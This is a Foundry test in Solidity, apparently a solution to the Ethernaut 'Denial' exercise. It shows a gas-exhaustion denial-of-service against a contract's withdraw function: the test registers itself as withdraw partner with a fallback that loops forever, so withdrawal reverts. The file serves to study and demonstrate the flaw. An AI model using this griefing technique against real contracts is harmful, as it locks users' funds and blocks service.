// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Denial.sol";

contract DenialTest is Test {
    Denial public denial;
    address partner;
    address user1;
    address user2;

    function setUp() public {
        partner = address(this);
        user1 = vm.addr(1);
        user2 = vm.addr(2);

        denial = new Denial();
    }

    function testDoS() public {
        assertEq(address(user1).balance, 0);
        vm.deal(user1, 10 ether);
        (bool success, ) = address(denial).call{value: 10 ether}("");
        assertTrue(success);

        assertEq(address(user2).balance, 0);
        denial.setWithdrawPartner(user2);

        denial.withdraw();
        assertGt(address(user2).balance, 0);

        denial.setWithdrawPartner(partner);

        vm.expectRevert();

        denial.withdraw{gas: 1100000}();
    }

    fallback() external payable {
        while (true) {}
    }
}
